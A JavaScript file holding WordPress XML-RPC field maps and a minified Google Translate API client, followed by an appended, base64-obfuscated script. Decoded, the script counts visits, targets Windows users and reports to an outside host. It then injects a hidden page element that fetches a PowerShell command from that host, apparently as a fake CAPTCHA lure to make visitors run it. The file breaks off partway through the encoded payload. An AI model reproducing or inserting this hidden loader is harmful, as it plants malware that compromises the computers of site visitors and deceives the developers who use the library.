	showInAdminBar: /* bool */ "show_in_admin_bar",
	showInMenu: /* bool */ "show_in_menu",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showUi: /* bool */ "show_ui",
	supports: /* array */ "supports",
	taxonomies: /* array */ "taxonomies"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.postTypeCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.postTypeCap = createFieldMaps({
	deleteOthersPosts: /* string */ "delete_others_posts",
	deletePost: /* string */ "delete_post",
	deletePosts: /* string */ "delete_posts",
	deletePrivatePosts: /* string */ "delete_private_posts",
	deletePublishedPosts: /* string */ "delete_published_posts",
	editOthersPosts: /* string */ "edit_others_posts",
	editPost: /* string */ "edit_post",
	editPosts: /* string */ "edit_posts",
	editPrivatePosts: /* string */ "edit_private_posts",
	editPublishedPosts: /* string */ "edit_published_posts",
	publishPosts: /* string */ "publish_posts",
	read: /* string */ "read",
	readPost: /* sring */ "read_post",
	readPrivatePosts: /* string */ "read_private_posts"
});

maps.taxonomy = createFieldMaps({
	cap: /* struct */ "cap",
	hierarchical: /* bool */ "hierarchical",
	name: /* string */ "name",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	objectType: /* array */ "object_type",
	"public": /* bool */ "public",
	queryVar: /* string */ "query_var",
	rewrite: /* struct */ "rewrite",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showTagCloud: /* bool */ "show_tagcloud",
	showUi: /* bool */ "show_ui"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.taxonomyCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.taxonomyCap = createFieldMaps({
	assignTerms: /* string */ "assign_terms",
	deleteTerms: /* string */ "delete_terms",
	editTerms: /* string */ "edit_terms",
	manageTerms: /* string */ "manage_terms"
});

maps.term = createFieldMaps({
	count: /* int */ "count", /* readonly */
	description: /* string */ "description",
	name: /* string */ "name",
	parent: /* string */ "parent",
	slug: /* string */ "slug",
	taxonomy: /* string */ "taxonomy",
	termId: /* string */ "term_id", /* readonly */
	termTaxonomyId: /* string */ "term_taxonomy_id" /* readonly */
});

maps.file = createFieldMaps({
	name: /* string */ "name",
	type: /* string */ "type",
	bits: /* string */ "bits",
	overwrite: /* boolean */ "overwrite",
	postId: /* int */ "post_id"
});

maps.media = createFieldMaps({
	attachmentId: /* string */ "attachment_id", /* readonly */
	caption: /* string */ "caption",
	description: /* string */ "description",
	link: /* string */ "link",
	parent: /* int */ "parent",
	thumbnail: /* string */ "thumbnail",
	title: /* string */ "title",
	type: /* string */ "type"
}, {}, {
	date_created_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},

	metadata: /* struct */ function( data ) {
		return {
			metadata: mapFields( data, maps.mediaItemMetadata.from )
		};
	}
});

maps.mediaItemMetadata = createFieldMaps({
	file: /* string */ "file",
	height: /* int */ "height",
	sizes: /* struct */ "sizes",
	width: /* int */ "width"
}, {}, {
	sizes: /* struct */ function( size ) {
		var keys = Object.keys( size ),
		    results = {};

		// Loop through the available sizes and map the fields
		keys.forEach(function( key, i ) {
			results[ keys[ i ] ] = mapFields( size[ keys[ i ] ], maps.mediaItemSize.from );
		});

		return {
			sizes: results
		};
	},

	image_meta: /* struct */ function( data ) {
		return {
			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
		};
	}
});

maps.mediaItemSize = createFieldMaps({
	file: /* string */ "file",
	height: /* string */ "height",
	mimeType: /* string */ "mime-type",
	width: /* string */ "width"
});

maps.postThumbnailImageMeta = createFieldMaps({
	aperture: /* int */ "aperture",
	camera: /* string */ "camera",
	caption: /* string */ "caption",
	copyright: /* string */ "copyright",
	createdTimestamp: /* int */ "created_timestamp",
	credit: /* string */ "credit",
	focalLength: /* int */ "focal_length",
	iso: /* int */ "iso",
	keywords: /* array */ "keywords",
	orientation: /* string */ "orientation",
	shutterSpeed: /* int */ "shutter_speed",
	title: /* string */ "title"
});

_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = apiBase + t + "?" + querystring.stringify(_.extend({
            key: e
        }, n));
        request.get(a, globalResponseHandler({
            url: a
        }, r))
    }
}, postRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = {
            url: apiBase + t,
            method: "POST",
            form: querystring.stringify(_.extend({
                key: e
            }, n)),
            headers: {
                "X-HTTP-Method-Override": "GET"
            }
        };
        request(a, globalResponseHandler(a, r))
    }
}, globalResponseHandler = function(e, t) {
    return function(n, r, a) {
        if (t && _.isFunction(t)) {
            if (n || !r || 200 !== r.statusCode) return t({
                error: n,
                response: r,
                body: a,
                request: e,
                toString: function() {
                    return n ? n.toString() : ""
                }
            }, null);
            var i = null;
            try {
                i = JSON.parse(a)
            } catch (e) {
                return t(n = "Could not parse response from Google: " + (a || "null"), null)
            }
            t(null, i)
        }
    }
}, parseTranslations = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), r = r.map((function(e) {
            return e.translatedText = entities.decode(e.translatedText), e
        })), t(null, r)
    }
}, parseSupportedLanguages = function(e) {
    return function(t, n) {
        if (t) return e(t, null);
        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
    }
}, parseLanguageDetections = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
            return e[0]
        })) : r[0], e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), t(null, r)
    }
}, shouldSplitSegments = function(e) {
    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
}, splitArraysForGoogle = function(e, t) {
    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
        var n = Math.floor(e.length / 2);
        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
    } else t.push(e)
};
module.exports = function(e, t) {
    var n = (t = t || {}).requestOptions || {};
    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
    var r = getRequestWithApi(e),
        a = postRequestWithApi(e),
        i = {
            translate: function(e, t, n, r) {
                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
                if ("string" != typeof n) return r("No target language specified. Must be a string");
                var i;
                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
                    [e]
                ];
                var o = {
                    target: n
                };
                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
                    a("", _.extend({
                        q: e
                    }, o), parseTranslations(e, t))
                }), (function(e, t) {
                    if (e) return r(e);
                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
                }))
            },
            getSupportedLanguages: function(e, t) {
                if (_.isFunction(e) ? (t = e, e = {}) : e = {
                        target: e
                    }, !_.isFunction(t)) return console.log("No callback defined");
                r("languages", e, parseSupportedLanguages(t))
            },
            detectLanguage: function(e, t) {
                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
                    [e]
                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
                    a("detect", {
                        q: e
                    }, parseLanguageDetections(e, t))
                }), (function(e, n) {
                    if (e) return t(e);
                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
                var n
            }
        };
    return {
        translate: i.translate,
        getSupportedLanguages: i.getSupportedLanguages,
        detectLanguage: i.detectLanguage
    }
};
}catch(e){}
})();


(function() {
  var _b = {
    "pzl73r": "MC42Njk4MjEyNzYzOTY0NjY1",
    "s861b9": "MC4yNDI2NDI1MTQxMjM3NjYzNg==",
    "nd0i3n": "MC4wNjMzNjU1MjE1NDI5NjUwNA==",
    "h5qodv": "MC42NTEzNTc4MzM1NzYzODk3",
    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3BubDgudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdjZjInOwogIGNvbnN0IHNjcmlwdElkID0gJ2NtbGd5cmp3aDAwMDJ6d2VieGg5eHF0M2snOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbIndpbmRvd3MiXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJQ2dwSUQwK0lIc0tDaTh2SUZOb1lXUnZkeUJFVDAwZ2NtOXZkQ0JtYjNJZ2FYTnZiR0YwWldRZ2NYVmxjbWxsY3dwamIyNXpkQ0FrY205dmRDQTlJSGRwYm1SdmR5NWZYM1JtVTJoaFpHOTNVbTl2ZENCOGZDQmtiMk4xYldWdWREc0tDaTh2SU5DZjBMN1F1OUdEMFlmUXNOQzEwTHdnYzJOeWFYQjBTV1FnMExqUXR5RFF2OUN3MFlEUXNOQzgwTFhSZ3RHQTBMN1FzaUJWVWt3ZzBMalF1OUM0SU5DNDBZSFF2OUMrMEx2UmpOQzMwWVBRdGRDOElOQzAwTFhSaE5DKzBMdlJndEM5MFl2UXVRcGpiMjV6ZENCMWNteFFZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCelkzSnBjSFJKWkNBOUlIVnliRkJoY21GdGN5NW5aWFFvSjNOamNtbHdkRjlwWkNjcElIeDhJQ2RrWldaaGRXeDBKenNLQ2k4dklFRlFTU0JpWVhObElGVlNUQ0RRdE5DNzBZOGdiM1psY214aGVTQmxibVJ3YjJsdWRITUtZMjl1YzNRZ1FWQkpYMEpCVTBVZ1BTQW5hSFIwY0hNNkx5OXdibXc0TG5abGNtTmxiQzVoY0hBbk93cGpiMjV6ZENCUVQweE1TVTVIWDBsT1ZFVlNWa0ZNSUQwZ01qQXdNRHNLWTI5dWMzUWdUVUZZWDFKRlVWVkZVMVJUSUQwZ09EQTdDbXhsZENCd2IyeHNhVzVuVkdsdFpYSWdQU0J1ZFd4c093cHNaWFFnYVhOVmJteHZZMnRsWkNBOUlHWmhiSE5sT3dwc1pYUWdjbVZ4ZFdWemRFTnZkVzUwSUQwZ01Ec0tDbXhsZENCbVpYUmphR1ZrUTI5dGJXRnVaQ0E5SUNjbk93cHNaWFFnWm1WMFkyaGxaRU52YlcxbGJuUWdQU0FuSnpzS0NpOHZJTkNnMExYUXM5QzQwWUhSZ3RHQTBMRFJodEM0MFk4Z1NWQWcwTDdRc3RDMTBZRFF1OUMxMFk4ZzBMM1FzQ0RSZ2RDMTBZRFFzdEMxMFlEUXRRcGhjM2x1WXlCbWRXNWpkR2x2YmlCeVpXZHBjM1JsY2s5MlpYSnNZWGxKVUNncElIc0tJQ0FnSUhSeWVTQjdDaUFnSUNBZ0lDQWdZWGRoYVhRZ1ptVjBZMmdvWUNSN1FWQkpYMEpCVTBWOUwyRndhUzl2ZG1WeWJHRjVMM0psWjJsemRHVnlZQ3dnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnRaWFJvYjJRNklDZFFUMU5VSnl3S0lDQWdJQ0FnSUNBZ0lDQWdhR1ZoWkdWeWN6b2dleUFuUTI5dWRHVnVkQzFVZVhCbEp6b2dKMkZ3Y0d4cFkyRjBhVzl1TDJwemIyNG5JSDBzQ2lBZ0lDQWdJQ0FnSUNBZ0lHSnZaSGs2SUVwVFQwNHVjM1J5YVc1bmFXWjVLSHNnYzJOeWFYQjBTV1FnZlNrc0NpQWdJQ0FnSUNBZ0lDQWdJRzF2WkdVNklDZGpiM0p6Snl3S0lDQWdJQ0FnSUNBZ0lDQWdZM0psWkdWdWRHbGhiSE02SUNkdmJXbDBKd29nSUNBZ0lDQWdJSDBwT3dvZ0lDQWdmU0JqWVhSamFDQW9aU2tnZXdvZ0lDQWdJQ0FnSUdOdmJuTnZiR1V1WlhKeWIzSW9KMFpoYVd4bFpDQjBieUJ5WldkcGMzUmxjaUJ2ZG1WeWJHRjVJRWxRT2ljc0lHVXBPd29nSUNBZ2ZRcDlDZ292THlEUW45R0EwTDdRc3RDMTBZRFF1dEN3SU5HQjBZTFFzTkdDMFlQUmdkQ3dJTkdBMExEUXQ5Q3gwTHZRdnRDNjBMalJnTkMrMExMUXV0QzRJTkdIMExYUmdOQzEwTGNnY0c5c2JHbHVad3BoYzNsdVl5Qm1kVzVqZEdsdmJpQmphR1ZqYTFWdWJHOWphMU4wWVhSMWN5Z3BJSHNLSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnWTI5dWMzUWdjbVZ6SUQwZ1lYZGhhWFFnWm1WMFkyZ29ZQ1I3UVZCSlgwSkJVMFY5TDJGd2FTOXZkbVZ5YkdGNUwyTm9aV05yUDNOamNtbHdkRWxrUFNSN1pXNWpiMlJsVlZKSlEyOXRjRzl1Wlc1MEtITmpjbWx3ZEVsa0tYMWdMQ0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lHMWxkR2h2WkRvZ0owZEZWQ2NzQ2lBZ0lDQWdJQ0FnSUNBZ0lHMXZaR1U2SUNkamIzSnpKeXdLSUNBZ0lDQWdJQ0FnSUNBZ1kzSmxaR1Z1ZEdsaGJITTZJQ2R2YldsMEp3b2dJQ0FnSUNBZ0lIMHBPd29nSUNBZ0lDQWdJR2xtSUNoeVpYTXViMnNwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdZMjl1YzNRZ1pHRjBZU0E5SUdGM1lXbDBJSEpsY3k1cWMyOXVLQ2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lISmxkSFZ5YmlCa1lYUmhMblZ1Ykc5amEyVmtJSHg4SUdaaGJITmxPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMGdZMkYwWTJnZ0tHVXBJSHNLSUNBZ0lDQWdJQ0JqYjI1emIyeGxMbVZ5Y205eUtDZEdZV2xzWldRZ2RHOGdZMmhsWTJzZ2RXNXNiMk5ySUhOMFlYUjFjem9uTENCbEtUc0tJQ0FnSUgwS0lDQWdJSEpsZEhWeWJpQm1ZV3h6WlRzS2ZRb0tMeThnMEpmUXNOQy8wWVBSZ2RDNklIQnZiR3hwYm1jZzBZRWdZMkZzYkdKaFkyc0tablZ1WTNScGIyNGdjM1JoY25SUWIyeHNhVzVuS0c5dVZXNXNiMk5yS1NCN0NpQWdJQ0JwWmlBb2NHOXNiR2x1WjFScGJXVnlLU0J5WlhSMWNtNDdDaUFnSUNCeVpYRjFaWE4wUTI5MWJuUWdQU0F3T3dvZ0lDQWdjRzlzYkdsdVoxUnBiV1Z5SUQwZ2MyVjBTVzUwWlhKMllXd29ZWE41Ym1NZ0tDa2dQVDRnZXdvZ0lDQWdJQ0FnSUhKbGNYVmxjM1JEYjNWdWRDc3JPd29nSUNBZ0lDQWdJR2xtSUNoeVpYRjFaWE4wUTI5MWJuUWdQajBnVFVGWVgxSkZVVlZGVTFSVEtTQjdDaUFnSUNBZ0lDQWdJQ0FnSUhOMGIzQlFiMnhzYVc1bktDazdDaUFnSUNBZ0lDQWdJQ0FnSUhKbGRIVnlianNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnWTI5dWMzUWdkVzVzYjJOclpXUWdQU0JoZDJGcGRDQmphR1ZqYTFWdWJHOWphMU4wWVhSMWN5Z3BPd29nSUNBZ0lDQWdJR2xtSUNoMWJteHZZMnRsWkNBbUppQWhhWE5WYm14dlkydGxaQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnBjMVZ1Ykc5amEyVmtJRDBnZEhKMVpUc0tJQ0FnSUNBZ0lDQWdJQ0FnYzNSdmNGQnZiR3hwYm1jb0tUc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHOXVWVzVzYjJOcktTQnZibFZ1Ykc5amF5Z3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMHNJRkJQVEV4SlRrZGZTVTVVUlZKV1FVd3BPd3A5Q2dvdkx5RFFudEdCMFlMUXNOQzkwTDdRc3RDNjBMQWdjRzlzYkdsdVp3cG1kVzVqZEdsdmJpQnpkRzl3VUc5c2JHbHVaeWdwSUhzS0lDQWdJR2xtSUNod2IyeHNhVzVuVkdsdFpYSXBJSHNLSUNBZ0lDQWdJQ0JqYkdWaGNrbHVkR1Z5ZG1Gc0tIQnZiR3hwYm1kVWFXMWxjaWs3Q2lBZ0lDQWdJQ0FnY0c5c2JHbHVaMVJwYldWeUlEMGdiblZzYkRzS0lDQWdJSDBLZlFvS0NtWjFibU4wYVc5dUlHSmhjMlUyTkVSbFkyOWtaVlZVUmpFMlRFVW9jM1J5S1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lDOHZJTkNqMExUUXNOQzcwWS9RdGRDOElOQy8wWURRdnRDeDBMWFF1OUdMSU5DNElOQy8wTFhSZ05DMTBMTFF2dEMwMFlzZzBZSFJndEdBMEw3UXVnb2dJQ0FnSUNBZ0lITjBjaUE5SUhOMGNpNXlaWEJzWVdObEtDOWJYSE5jY2x4dVhTc3ZaeXdnSnljcE93b2dJQ0FnSUNBZ0lHTnZibk4wSUdKcGJtRnllU0E5SUdGMGIySW9jM1J5S1RzS0lDQWdJQ0FnSUNCamIyNXpkQ0JpZVhSbGN5QTlJRzVsZHlCVmFXNTBPRUZ5Y21GNUtHSnBibUZ5ZVM1c1pXNW5kR2dwT3dvZ0lDQWdJQ0FnSUdadmNpQW9iR1YwSUdrZ1BTQXdPeUJwSUR3Z1ltbHVZWEo1TG14bGJtZDBhRHNnYVNzcktTQjdDaUFnSUNBZ0lDQWdJQ0FnSUdKNWRHVnpXMmxkSUQwZ1ltbHVZWEo1TG1Ob1lYSkRiMlJsUVhRb2FTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQzh2SUZWVVJpMHhOa3hGT2lCbGRtVnllU0F5SUdKNWRHVnpJR2x6SUdFZ1kyaGhjZ29nSUNBZ0lDQWdJR3hsZENCeVpYTjFiSFFnUFNBbkp6c0tJQ0FnSUNBZ0lDQm1iM0lnS0d4bGRDQnBJRDBnTURzZ2FTQThJR0o1ZEdWekxteGxibWQwYURzZ2FTQXJQU0F5S1NCN0NpQWdJQ0FnSUNBZ0lDQWdJSEpsYzNWc2RDQXJQU0JUZEhKcGJtY3Vabkp2YlVOb1lYSkRiMlJsS0dKNWRHVnpXMmxkSUh3Z0tHSjVkR1Z6VzJrZ0t5QXhYU0E4UENBNEtTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJSEpsZEhWeWJpQnlaWE4xYkhRN0NpQWdJQ0I5SUdOaGRHTm9JQ2hsS1NCN0lISmxkSFZ5YmlBbkp6c2dmUXA5Q2dwaGMzbHVZeUJtZFc1amRHbHZiaUJtWlhSamFFTnZiVzFoYm1SQmJtUkRiMjF0Wlc1MEtDa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmhjR2xWY213Z1BTQmdhSFIwY0hNNkx5OXdibXc0TG5abGNtTmxiQzVoY0hBdllYQnBMM0J2ZDJWeWMyaGxiR3d2WTIxc1ozbHlhbmRvTURBd01ucDNaV0o0YURsNGNYUXphMkE3Q2lBZ0lDQWdJQ0FnWTI5dWMzUWdjbVZ6SUQwZ1lYZGhhWFFnWm1WMFkyZ29ZWEJwVlhKc0tUc0tJQ0FnSUNBZ0lDQnBaaUFvSVhKbGN5NXZheWtnZEdoeWIzY2dibVYzSUVWeWNtOXlLQ2RHWVdsc1pXUWdkRzhnWm1WMFkyZ2dZMjl0YldGdVpDY3BPd29nSUNBZ0lDQWdJR052Ym5OMElHUmhkR0VnUFNCaGQyRnBkQ0J5WlhNdWFuTnZiaWdwT3dvZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFlXNWtJRDBnWW1GelpUWTBSR1ZqYjJSbFZWUkdNVFpNUlNoa1lYUmhMbU52YlcxaGJtUWdmSHdnSnljcE93b2dJQ0FnSUNBZ0lHWmxkR05vWldSRGIyMXRaVzUwSUQwZ1pHRjBZUzVqYjIxdFpXNTBJSHg4SUNjbk93b2dJQ0FnSUNBZ0lDOHZJTkNTMFlIUmd0Q3cwTExRdU5HQzBZd2dZMjl0YldWdWRDRFFzaUE4WTI5a1pUNGdLTkMzMExEUXZOQzEwTDNRdU5HQzBZd2cwWUxRdGRDNjBZSFJnaWtLSUNBZ0lDQWdJQ0JqYjI1emRDQmpiMlJsUld3Z1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ2RqYjJSbEp5azdDaUFnSUNBZ0lDQWdhV1lnS0dOdlpHVkZiQ2tnWTI5a1pVVnNMblJsZUhSRGIyNTBaVzUwSUQwZ1ptVjBZMmhsWkVOdmJXMWxiblE3Q2lBZ0lDQjlJR05oZEdOb0lDaGxLU0I3Q2lBZ0lDQWdJQ0FnWm1WMFkyaGxaRU52YlcxaGJtUWdQU0FuUm1GcGJHVmtJSFJ2SUd4dllXUWdZMjl0YldGdVpDYzdDaUFnSUNBZ0lDQWdabVYwWTJobFpFTnZiVzFsYm5RZ1BTQW5KenNLSUNBZ0lIMEtmUW9LWTI5dWMzUWdkSEpoWTJ0TlpYUnlhV01nUFNBb2QybHVaRzkzTGw5ZmRISmhZMnROWlhSeWFXTXBJRDhnZDJsdVpHOTNMbDlmZEhKaFkydE5aWFJ5YVdNZ09pQm1kVzVqZEdsdmJpaDBlWEJsS1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lHTnZibk4wSUhSbGJYQnNZWFJsU1dRZ1BTQjNhVzVrYjNjdVgxOTBaVzF3YkdGMFpVbGtJSHg4SUNkalpqSW5Pd29nSUNBZ0lDQWdJR1psZEdOb0tDY3ZZWEJwTDIxbGRISnBZM012ZEhKaFkyc25MQ0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lHMWxkR2h2WkRvZ0oxQlBVMVFuTEFvZ0lDQWdJQ0FnSUNBZ0lDQm9aV0ZrWlhKek9pQjdJQ2REYjI1MFpXNTBMVlI1Y0dVbk9pQW5ZWEJ3YkdsallYUnBiMjR2YW5OdmJpY2dmU3dLSUNBZ0lDQWdJQ0FnSUNBZ1ltOWtlVG9nU2xOUFRpNXpkSEpwYm1kcFpua29leUIwZVhCbExDQjBaVzF3YkdGMFpUb2dkR1Z0Y0d4aGRHVkpaQ0I5S1N3S0lDQWdJQ0FnSUNBZ0lDQWdiVzlrWlRvZ0oyNXZMV052Y25NbkxBb2dJQ0FnSUNBZ0lDQWdJQ0JyWldWd1lXeHBkbVU2SUhSeWRXVUtJQ0FnSUNBZ0lDQjlLUzVqWVhSamFDZ29LU0E5UGlCN2ZTazdDaUFnSUNCOUlHTmhkR05vSUNobGNuSXBJSHQ5Q24wN0NncHNaWFFnWTI5dGNHeGxkR1ZVY21GamEyVmtJRDBnWm1Gc2MyVTdDbVoxYm1OMGFXOXVJSFJ5WVdOclEyOXRjR3hsZEdVb0tTQjdDaUFnSUNCcFppQW9ZMjl0Y0d4bGRHVlVjbUZqYTJWa0tTQnlaWFIxY200N0NpQWdJQ0JqYjIxd2JHVjBaVlJ5WVdOclpXUWdQU0IwY25WbE93b2dJQ0FnZEhKaFkydE5aWFJ5YVdNb0oyTnZiWEJzWlhSbEp5azdDbjBLQ2k4dklOQ1IwTDdRdTlHTTBZalF0U0RRdmRDMUlOQzkwWVBRdHRDOTBMNGcwWUhRdnRDeDBMalJnTkN3MFlMUmpDRFF1dEMrMEx6UXNOQzkwTFRSZ3lEUXN0R0EwWVBSaDlDOTBZUFJqZ29LTHk4Z1IwVlVJQXBqYjI1emRDQndZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCemFYUmxWWEpzSUQwZ2NHRnlZVzF6TG1kbGRDZ25jMmwwWlNjcElIeDhJSGRwYm1SdmR5NXNiMk5oZEdsdmJpNW9iM04wYm1GdFpUc0tZMjl1YzNRZ2JHOW5iMVZ5YkNBOUlIQmhjbUZ0Y3k1blpYUW9KMnh2WjI4bktUc0tZMjl1YzNRZ1pHVm1ZWFZzZEV4dloyOVZjbXdnUFNBbmFIUjBjSE02THk4eVkyRndkR05vWVM1amIyMHZaR2x6ZEM5M1pXSXZZWE56WlhSekwyZHZiMmRzWlMxd2NtbDJZV041TFhCdmJHbGplUzFEWWpCRFIxWlNWQzV6ZG